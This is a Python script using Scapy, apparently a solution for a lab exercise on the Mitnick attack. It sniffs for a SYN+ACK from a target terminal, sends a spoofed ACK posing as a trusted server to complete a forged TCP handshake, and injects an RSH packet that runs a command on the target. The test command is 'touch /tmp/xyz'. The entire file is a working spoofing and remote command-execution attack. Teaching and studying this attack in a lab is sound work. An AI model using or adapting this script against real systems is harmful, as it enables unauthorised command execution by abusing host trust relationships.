#!/usr/bin/python3
from scapy.all import *
import config

#Initial Sequence Number (must match 'trigger.py' sequence +1
seq_num=778933536 + 1

def spoof(pkt):
	global seq_num
	
	# Look for a SYN+ACK packet from X-Terminal
	if pkt.haslayer(TCP) and pkt[TCP].flags=='SA':
		old_tcp=pkt[TCP]
		print(f"[*] Received SYN+ACK from Target. Seq: {old_tcp.seq}")

		# Send ACK to complete the Handshake
		# Construct IP Header (spoofed)
		ip= IP(src=config.TRUSTED_SERVER_IP, dst=config.X_TERMINAL_IP)

		# Calculate the correct Acknowledgment number
		ack_num=old_tcp.seq+1

		# Construct TCP Header (ACK)
		tcp_ack= TCP(sport=config.TRUSTED_SERVER_PORT, dport=config.X_TERMINAL_PORT, flags='A', seq=seq_num, ack=ack_num)

		print(f"[*] Sending Spoofed ACK response...")
		send(ip/tcp_ack, verbose=0)



		# Send RSH Data Packet
		#The connection is established, now send the payload
		#RSH Protocol Format: [stderr port]\0[client_user \0[server_user]\0[command]\0
		# Use port '9090' for the error channel (handled in Task 2.2)
		# Use 'touch /tmp/xyz' as test command
		data= '9090\x00seed\x00seed\x00touch /tmp/xyz\x00'

		#Construct TCP Data Packet (PSH+ACK)
		#Use the same seq_num because the previou ACL carried 0 bytes of data
		tcp_data=TCP(sport=config.TRUSTED_SERVER_PORT, dport=config.X_TERMINAL_PORT, flags='PA', seq=seq_num, ack=ack_num)

		print(f"[*] Sending RSH Payload: {data}")
		send(ip/tcp_data/data, verbose=0)
		return

# Sniffer Filter (consider only the traffic going from X-Terminal to the Trusted Server
myFilter = f"tcp and src host {config.X_TERMINAL_IP} and src port {config.X_TERMINAL_PORT} and dst host {config.TRUSTED_SERVER_IP} and dst port {config.TRUSTED_SERVER_PORT}"

print(f"[*] Sniffing started... Filter: {myFilter}")
sniff(iface=config.IFACE, filter=myFilter, prn=spoof)
